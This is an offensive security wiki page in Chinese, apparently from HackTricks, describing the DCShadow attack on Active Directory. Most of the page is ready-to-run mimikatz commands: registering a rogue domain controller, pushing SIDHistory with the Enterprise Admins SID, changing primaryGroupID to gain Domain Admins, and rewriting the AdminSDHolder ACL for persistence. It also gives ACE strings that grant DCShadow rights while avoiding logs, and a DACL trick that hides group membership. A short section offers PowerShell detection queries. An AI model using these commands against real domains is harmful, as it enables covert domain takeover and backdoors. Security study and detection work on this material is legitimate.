# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## 基本信息

它会在 AD 中注册一个**新的 Domain Controller**，并使用它向指定对象**推送属性**（SIDHistory、SPNs……），且不会留下任何关于这些**修改**的**日志**。你**需要 DA**权限，并且必须位于**根域**中。\
请注意，如果使用了错误的数据，将会出现非常难看的日志。<sup>[[2]](#references)</sup>

要执行此攻击，你需要 2 个 mimikatz 实例。其中一个实例将以 SYSTEM 权限启动 RPC servers（你必须在此处指明要执行的修改），另一个实例将用于推送这些值：
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
注意，**`elevate::token`** 在 `mimikatz1` session 中无法工作，因为它提升的是线程的权限，而我们需要提升的是**进程的权限**。\
你也可以选择一个 "LDAP" object：`/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

你可以通过 DA，或通过具有以下最小权限的用户推送更改：

- 在**域对象**中：
- _DS-Install-Replica_（在域中添加/删除 Replica）
- _DS-Replication-Manage-Topology_（管理 Replication Topology）
- _DS-Replication-Synchronize_（Replication Synchronization）
- **Configuration container** 中的 **Sites object**（及其子对象）：
- _CreateChild and DeleteChild_
- 已注册为 DC 的**计算机对象**：
- _WriteProperty_（不是 Write）
- **目标对象**：
- _WriteProperty_（不是 Write）

你可以使用 [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) 将这些权限授予非特权用户（注意，这会留下部分日志）。这比拥有 DA 权限的限制严格得多。\
例如：`Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` 这表示用户 _**student1**_ 在登录计算机 _**mcorp-student1**_ 时，对对象 _**root1user**_ 具有 DCShadow 权限。

## 使用 DCShadow 创建后门
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Primary group 滥用、枚举缺口与检测

- `primaryGroupID` 是独立于组 `member` 列表的另一个属性。DCShadow/DSInternals 可以直接写入该属性（例如，将 `primaryGroupID=512` 设置为 **Domain Admins**），绕过本机 LSASS 强制执行；但 AD 仍会**移动**该用户：更改 PGID 始终会将用户从之前的 primary group 中移除（任何目标组均遵循相同行为），因此无法保留原有的 primary-group membership。<sup>[[1]](#references)</sup>
- 默认工具不允许将用户从其当前 primary group 中移除（`ADUC`、`Remove-ADGroupMember`），因此更改 PGID 通常需要直接写入目录（DCShadow/`Set-ADDBPrimaryGroup`）。
- Membership 报告不一致：
- **包含**由 primary group 推导出的成员：`Get-ADGroupMember "Domain Admins"`、`net group "Domain Admins"`、ADUC/Admin Center。
- **省略**由 primary group 推导出的成员：`Get-ADGroup "Domain Admins" -Properties member`、通过 ADSI Edit 检查 `member`、`Get-ADUser <user> -Properties memberOf`。
- 如果 primary group 本身是嵌套组，递归检查可能会遗漏 primary-group 成员（例如，用户的 PGID 指向 Domain Admins 内部的某个嵌套组）；`Get-ADGroupMember -Recursive` 或 LDAP recursive filters 不会返回该用户，除非递归逻辑显式解析 primary groups。
- DACL 技巧：攻击者可以在用户上针对 `primaryGroupID` **拒绝 ReadProperty**（或者针对非 AdminSDHolder 组的 `member` 属性执行相同操作），从而对大多数 PowerShell 查询隐藏有效 membership；但 `net group` 仍会解析该 membership。受 AdminSDHolder 保护的组会重置此类拒绝权限。

检测/监控示例：
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
通过将 `Get-ADGroupMember` 的输出与 `Get-ADGroup -Properties member` 或 ADSI Edit 的结果进行比较，交叉检查特权组，以发现由 `primaryGroupID` 或隐藏属性引入的差异。<sup>[[1]](#references)</sup>

## Shadowception - 使用 DCShadow 授予 DCShadow 权限（无修改权限日志）

我们需要在末尾追加以下 ACE，并使用我们用户的 SID：<sup>[[2]](#references)</sup>

- 在域对象上：
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- 在攻击者计算机对象上：`(A;;WP;;;UserSID)`
- 在目标用户对象上：`(A;;WP;;;UserSID)`
- 在 Configuration 容器中的 Sites 对象上：`(A;CI;CCDC;;;UserSID)`

获取对象当前 ACE：`(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

注意，在这种情况下需要进行**多项更改，**而不只是一次更改。因此，在 **mimikatz1 会话**（RPC server）中，对想要执行的每项更改都使用参数 **`/stack`**。这样，你只需执行一次 **`/push`**，即可在 rogue server 中执行所有已堆叠的更改。

[**有关 DCShadow 的更多信息，请参阅 ired.team。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## References

- [1] [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
